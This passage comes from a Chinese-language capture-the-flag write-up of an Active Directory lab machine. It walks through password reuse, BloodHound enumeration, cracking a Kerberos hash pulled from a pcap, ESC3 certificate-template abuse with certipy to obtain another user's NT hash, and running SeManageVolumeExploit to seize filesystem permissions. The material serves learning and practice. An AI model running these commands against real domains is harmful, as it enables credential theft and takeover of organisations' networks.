<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb/ldap/winrm 10.10.11.71 -u user -p <span class="string">&quot;Blink182&quot;</span> --continue-on-success</span><br><span class="line">SMB/LDAP/WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\sara.b:Blink182 (Pwn3d!)</span><br></pre></td></tr></table></figure>
<p>成功撤离</p>
<h2 id="shell-as-sara-b"><a href="#shell-as-sara-b" class="headerlink" title="shell as sara.b"></a>shell as sara.b</h2><p>bloodhound一下，另外，faketime还是好用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&quot;+27514s&quot;</span> evil-winrm -i certificate.htb -u Sara.B -p <span class="string">&quot;Blink182&quot;</span>      </span><br><span class="line">/home/wansh/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">/home/wansh/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="string">&#x27;quoting_detection_proc&#x27;</span> <span class="keyword">for</span> module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Sara.B\Documents&gt; </span><br><span class="line"></span><br><span class="line">$ faketime -f <span class="string">&quot;+27514s&quot;</span> bloodhound-ce-python -u sara.b -p <span class="string">&quot;Blink182&quot;</span> -ns 10.10.11.71 -dc dc01.certificate.htb -c all --zip -d certificate.htb</span><br><span class="line">INFO: BloodHound.py <span class="keyword">for</span> BloodHound Community Edition</span><br><span class="line">INFO: Found AD domain: certificate.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.certificate.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 3 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.certificate.htb</span><br><span class="line">INFO: Found 19 <span class="built_in">users</span></span><br><span class="line">INFO: Found 58 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: WS-05.certificate.htb</span><br><span class="line">INFO: Querying computer: WS-01.certificate.htb</span><br><span class="line">INFO: Querying computer: DC01.certificate.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 30S</span><br><span class="line">INFO: Compressing output into 20250603184701_bloodhound.zip</span><br></pre></td></tr></table></figure>
<p><img src="/images/certificate-12.png"><br>sara.b在<code>DOMAIN USER</code>、<code>ACCOUNT OPERATORS</code>、<code>HELP DESK</code>三个用户组里面，其中其实account operators用户组特别一点<br>  Account Operators：账号操作员组，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器，但是，不能更改属于 Administrators 或 Domain Admins 组的账户，也不能修改这些组。在默认情况下，该组中没有成员。</p>
<p>而且在Documents文件夹下面有一个特殊的文件夹<code>WS-01</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Sara.B\Documents\WS-01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        11/4/2024  12:44 AM            530 Description.txt</span><br><span class="line">-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt; <span class="built_in">type</span> Description.txt</span><br><span class="line">The workstation 01 is not able to open the <span class="string">&quot;Reports&quot;</span> smb shared folder <span class="built_in">which</span> is hosted on DC01.</span><br><span class="line">When a user tries to input bad credentials, it returns bad credentials error.</span><br><span class="line">But when a user provides valid credentials the file explorer freezes and <span class="keyword">then</span> crashes!</span><br><span class="line">工作站 01 无法打开托管在 DC01 上的“Reports”SMB 共享文件夹。</span><br><span class="line">当用户尝试输入错误凭据时，它会返回错误凭据错误。</span><br><span class="line">但是，当用户提供有效凭据时，文件资源管理器会冻结并崩溃！</span><br></pre></td></tr></table></figure>
<p>下载下来看看</p>
<h3 id="account-operators"><a href="#account-operators" class="headerlink" title="account operators"></a>account operators</h3><p>这里可以直接利用组用户权限来更改用户密码，在Users下面找找用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt; <span class="built_in">dir</span> <span class="string">&quot;C:\Users&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       12/30/2024   8:33 PM                Administrator</span><br><span class="line">d-----       11/23/2024   6:59 PM                akeder.kh</span><br><span class="line">d-----        11/4/2024  12:55 AM                Lion.SK</span><br><span class="line">d-r---         6/3/2025   2:22 AM                Public</span><br><span class="line">d-----        11/3/2024   7:26 PM                Ryan.K</span><br><span class="line">d-----       11/26/2024   4:12 PM                Sara.B</span><br><span class="line">d-----       12/29/2024   5:30 PM                xamppuser</span><br></pre></td></tr></table></figure>
<p>这里用powerview试试，结合bloodhound挑选一下<br>其中lion.sk有remote management user组，改一下试试<br><img src="/images/certificate-13.png"><br>这样就成了哈哈哈</p>
<h3 id="Analyzing-pcap-files"><a href="#Analyzing-pcap-files" class="headerlink" title="Analyzing pcap files"></a>Analyzing pcap files</h3><p>下载看到的pcap文件<br>Google可以找到一些<a target="_blank" rel="noopener" href="https://github.com/mlgualtieri/NTLMRawUnHide">从pcap提取hash的工具</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ python3 NTLMRawUnHide.py -i WS-01_PktMon.pcap -v -o result.txt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> result.txt | awk -F <span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>
<p>全是administrator，试着解一下<br>无解，打开pcap文件<br><img src="/images/certificate-14.png"><br>好多流量无处下手，Windows登录通常会设计kerberos，ntlm或smb协议，先看smb2（打开流量一眼就可以看到）<br><img src="/images/certificate-15.png"><br>这不都是我们刚刚脚本整理但是解不出来的，换Kerberos<br><img src="/images/certificate-16.png"><br>流量一下就少了，看一下两个，一个917的包一个922<br>917是发送到as的数据包，922是as发出来的数据包，用户密码主要保存在917的AS_REQ的加密时间戳当中<br><img src="/images/certificate-17.png"><br>hash格式一般是<code>$krb5pa$18$user$realm$cipher</code>，整理一下<br>  user:Lion.SK<br>  realm:CERTIFICATE.HTB<br>  cipher:23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0<br>  hash:$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0<br>hashcat解一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -a 0 -m 19900 lion.hash /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt </span><br><span class="line">$krb5pa$18<span class="variable">$Lion</span>.SK<span class="variable">$CERTIFICATE</span>.HTB<span class="variable">$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0</span>:!QAZ2wsx</span><br></pre></td></tr></table></figure>
<p>出来了，看一下是不是lion的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb/ldap/winrm 10.10.11.71 -u lion.sk -p <span class="string">&#x27;!QAZ2wsx&#x27;</span></span><br><span class="line">SMB/LDAP/WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\lion.sk:!QAZ2wsx (Pwn3d!)</span><br></pre></td></tr></table></figure>
<h2 id="shell-as-lion-sk"><a href="#shell-as-lion-sk" class="headerlink" title="shell as lion.sk"></a>shell as lion.sk</h2><p><img src="/images/certificate-18.png"><br>看一下lion.sk都有啥<br><img src="/images/certificate-19.png"></p>
<h3 id="exploit-ESC3"><a href="#exploit-ESC3" class="headerlink" title="exploit ESC3"></a>exploit ESC3</h3><p>多能人才，他还在ADCS组里面，机器图标还是证书样式，找一下证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ certipy find -target dc01.certificate.htb -dc-ip 10.10.11.71 -u lion.sk -p <span class="string">&#x27;!QAZ2wsx&#x27;</span> </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 35 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Finding issuance policies</span><br><span class="line">[*] Found 18 issuance policies</span><br><span class="line">[*] Found 0 OIDs linked to templates</span><br><span class="line">[*] Retrieving CA configuration <span class="keyword">for</span> <span class="string">&#x27;Certificate-LTD-CA&#x27;</span> via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Successfully retrieved CA configuration <span class="keyword">for</span> <span class="string">&#x27;Certificate-LTD-CA&#x27;</span></span><br><span class="line">[*] Checking web enrollment <span class="keyword">for</span> CA <span class="string">&#x27;Certificate-LTD-CA&#x27;</span> @ <span class="string">&#x27;DC01.certificate.htb&#x27;</span></span><br><span class="line">[!] Error checking web enrollment: timed out</span><br><span class="line">[!] Use -debug to <span class="built_in">print</span> a stacktrace</span><br><span class="line">[*] Saving text output to <span class="string">&#x27;20250603160111_Certipy.txt&#x27;</span></span><br><span class="line">[*] Wrote text output to <span class="string">&#x27;20250603160111_Certipy.txt&#x27;</span></span><br><span class="line">[*] Saving JSON output to <span class="string">&#x27;20250603160111_Certipy.json&#x27;</span></span><br><span class="line">[*] Wrote JSON output to <span class="string">&#x27;20250603160111_Certipy.json&#x27;</span></span><br></pre></td></tr></table></figure>
<p>找到一个ESC3的，再往下滑，找到好几个ESC3的<br><img src="/images/certificate-21.png"><br>要利用ESC3需要两个条件<br>  Obtaining an Enrollment Agent Certificate: The attacker must first acquire a certificate that includes the “Certificate Request Agent” EKU (Object Identifier 1.3.6.1.4.1.311.20.2.1). This can occur if:<br>  获取注册代理证书： 攻击者必须首先获取包含“证书请求代理”EKU （对象标识符 1.3.6.1.4.1.311.20.2.1） 的证书。如果出现以下情况，则可能会发生这种情况：</p>
<p>  A certificate template specifically designed to issue Enrollment Agent certificates (e.g., the built-in “EnrollmentAgent” template, “CEPEncryption” template, or a custom equivalent) has overly permissive enrollment rights, allowing the attacker (or a group they belong to, like “Domain Users”) to enroll.<br>  专门用于颁发注册代理证书的证书模板（例如，内置的“EnrollmentAgent”模板、“CEPEncryption”模板或自定义等效模板）具有过于宽松的注册权限，允许攻击者（或他们所属的组，如“域用户”）注册。<br>  A template vulnerable to ESC2 (“Any Purpose” EKU or no EKU) is enrollable by the attacker, as “Any Purpose” implicitly includes the “Certificate Request Agent” capability.<br>  攻击者可以注册易受 ESC2 攻击的模板（“任何用途”EKU 或无 EKU），因为“任何用途”隐含包含“证书请求代理”功能。<br>  A Target Certificate Template Allowing Agent Enrollment: There must be another certificate template (the “target template”) that:<br>  允许代理注册的目标证书模板： 必须有另一个证书模板（“目标模板”），该模板：</p>
<p>  Issues certificates suitable for authentication (e.g., it includes the “Client Authentication” EKU or “Smart Card Logon” EKU).<br>  颁发适合身份验证的证书 （例如，它包括“客户端身份验证”EKU 或“智能卡登录”EKU）。<br>  Is configured to allow an Enrollment Agent to request certificates on behalf of other users. Many default templates, particularly Schema Version 1 templates like the built-in “User” or “Machine” templates, inherently permit this without requiring specific enrollment agent restrictions in their issuance policy.<br>  配置为允许注册代理代表其他用户请求证书。许多默认模板，尤其是 Schema Version 1 模板（如内置的“User”或“Machine”模板）本身就允许这样做，而无需在其颁发策略中进行特定的注册代理限制。<br>  The intended victim (e.g., a Domain Administrator) must have enrollment rights on this target template.<br>  预期的受害者（例如，域管理员）必须具有此目标模板的注册权限。<br>先找包含EKU的证书<br><img src="/images/certificate-22.png"><br>在上面的时候就有了，然后再找另一个证书模板<br>上面请求中提到<code>SubjectRequireEmail</code>，看一下哪些用户有</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">╰─PV ❯ Get-DomainUser -Select sAMAccountName,mail -TableView </span><br><span class="line">[2025-06-04 09:56:12] [Formatter] Results from cache. Use <span class="string">&#x27;Clear-Cache&#x27;</span> or <span class="string">&#x27;-NoCache&#x27;</span> to refresh.</span><br><span class="line"></span><br><span class="line">sAMAccountName    mail</span><br><span class="line">----------------  -----------------------</span><br><span class="line">xamppuser</span><br><span class="line">saad.m            saad.m@certificate.htb</span><br><span class="line">karol.s</span><br><span class="line">Alex.D            alex.d@certificate.htb</span><br><span class="line">kara.m</span><br><span class="line">akeder.kh</span><br><span class="line">Ryan.K            ryan.k@certificate.htb</span><br><span class="line">Eva.F             eva.f@certificate.htb</span><br><span class="line">Lion.SK           lion.sk@certificate.htb</span><br><span class="line">Maya.K            maya.k@certificate.htb</span><br><span class="line">Nya.S             nya.s@certificate.htb</span><br><span class="line">Aya.W             aya.w@certificate.htb</span><br><span class="line">John.C            john.c@certificate.htb</span><br><span class="line">Sara.B            sara.b@certificate.htb</span><br><span class="line">Kai.X             kai.x@certificate.htb</span><br><span class="line">krbtgt</span><br><span class="line">Guest</span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>
<p><img src="/images/certificate-23.png"><br>请求一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&quot;+27511s&quot;</span> certipy req -u lion.sk@certificate.htb -p <span class="string">&#x27;!QAZ2wsx&#x27;</span> -dc-ip <span class="string">&#x27;10.10.11.71&#x27;</span> -target <span class="string">&#x27;dc01.certificate.htb&#x27;</span> -ca <span class="string">&#x27;Certificate-LTD-CA&#x27;</span> -template <span class="string">&#x27;Delegated-CRA&#x27;</span>       </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 34</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;Lion.SK@certificate.htb&#x27;</span></span><br><span class="line">[*] Certificate object SID is <span class="string">&#x27;S-1-5-21-515537669-4223687196-3249690583-1115&#x27;</span></span><br><span class="line">[*] Saving certificate and private key to <span class="string">&#x27;lion.sk.pfx&#x27;</span></span><br><span class="line">[*] Wrote certificate and private key to <span class="string">&#x27;lion.sk.pfx&#x27;</span></span><br><span class="line"></span><br><span class="line">$ faketime -f <span class="string">&quot;+27511s&quot;</span> certipy req -u lion.sk@certificate.htb -p <span class="string">&#x27;!QAZ2wsx&#x27;</span> -dc-ip <span class="string">&#x27;10.10.11.71&#x27;</span> -target <span class="string">&#x27;dc01.certificate.htb&#x27;</span> -ca <span class="string">&#x27;Certificate-LTD-CA&#x27;</span> -template <span class="string">&#x27;SignedUser&#x27;</span> -pfx lion.sk.pfx -on-behalf-of <span class="string">&#x27;certificate\RYAN.K&#x27;</span></span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 35</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;RYAN.K@certificate.htb&#x27;</span></span><br><span class="line">[*] Certificate object SID is <span class="string">&#x27;S-1-5-21-515537669-4223687196-3249690583-1117&#x27;</span></span><br><span class="line">[*] Saving certificate and private key to <span class="string">&#x27;ryan.k.pfx&#x27;</span></span><br><span class="line">[*] Wrote certificate and private key to <span class="string">&#x27;ryan.k.pfx&#x27;</span></span><br><span class="line"></span><br><span class="line">$ faketime -f <span class="string">&quot;+27511s&quot;</span> certipy auth -pfx ryan.k.pfx -username ryan.k -dc-ip 10.10.11.71                        </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN UPN: <span class="string">&#x27;RYAN.K@certificate.htb&#x27;</span></span><br><span class="line">[*]     Security Extension SID: <span class="string">&#x27;S-1-5-21-515537669-4223687196-3249690583-1117&#x27;</span></span><br><span class="line">[*] Using principal: <span class="string">&#x27;ryan.k@certificate.htb&#x27;</span></span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to <span class="string">&#x27;ryan.k.ccache&#x27;</span></span><br><span class="line">[*] Wrote credential cache to <span class="string">&#x27;ryan.k.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;ryan.k&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;ryan.k@certificate.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6</span><br></pre></td></tr></table></figure>
<h2 id="shell-as-ryan-k"><a href="#shell-as-ryan-k" class="headerlink" title="shell as ryan.k"></a>shell as ryan.k</h2><h3 id="SeManageVolumeExploit-exe-and-Gloden-Certificate-Attack"><a href="#SeManageVolumeExploit-exe-and-Gloden-Certificate-Attack" class="headerlink" title="SeManageVolumeExploit.exe and Gloden Certificate Attack"></a>SeManageVolumeExploit.exe and Gloden Certificate Attack</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Ryan.K&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                      State</span><br><span class="line">============================= ================================ =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain       Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking         Enabled</span><br><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span>   Enabled</span><br></pre></td></tr></table></figure>
<p>有一个<code>SeManageVolumePrivilege</code>，找一下Google问问，这是允许特定的卷级管理操作权限，滥用可以修改卷级访问控制<br>找到一个<a target="_blank" rel="noopener" href="https://github.com/CsEnox/SeManageVolumeExploit">exploit</a>，下载一下上传上去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\xxx&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----         6/4/2025   3:43 AM          12288 SeManageVolumeExploit.exe</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\xxx&gt; .\SeManageVolumeExploit.exe</span><br><span class="line">Entries changed: 866</span><br><span class="line"></span><br><span class="line">DONE</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\xxx&gt; icacls C:\</span><br><span class="line">C:\ NT AUTHORITY\SYSTEM:(OI)(CI)(F)</span><br><span class="line">    BUILTIN\Users:(OI)(CI)(F)</span><br><span class="line">    BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(RX)</span><br><span class="line">    BUILTIN\Pre-Windows 2000 Compatible Access:(CI)(AD)</span><br><span class="line">    BUILTIN\Pre-Windows 2000 Compatible Access:(CI)(IO)(WD)</span><br><span class="line">    CREATOR OWNER:(OI)(CI)(IO)(F)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br><span class="line">*Evil-WinRM* PS C:\xxx&gt; icacls C:\Windows\system32</span><br><span class="line">C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)</span><br><span class="line">                    NT SERVICE\TrustedInstaller:(CI)(IO)(F)</span><br><span class="line">                    NT AUTHORITY\SYSTEM:(M)</span><br><span class="line">                    NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)</span><br><span class="line">                    BUILTIN\Users:(M)</span><br><span class="line">                    BUILTIN\Users:(OI)(CI)(IO)(F)</span><br><span class="line">                    BUILTIN\Pre-Windows 2000 Compatible Access:(RX)</span><br><span class="line">                    BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(IO)(GR,GE)</span><br><span class="line">                    CREATOR OWNER:(OI)(CI)(IO)(F)</span><br><span class="line">                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)</span><br><span class="line">                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)</span><br><span class="line">                    APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)</span><br><span class="line">                    APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>
<p>机器是跟证书有关系，找一下可不可以拿到根证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a--s-        11/3/2024   7:24 PM           2269 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958</span><br><span class="line">-a--s-        11/3/2024   8:03 PM           2232 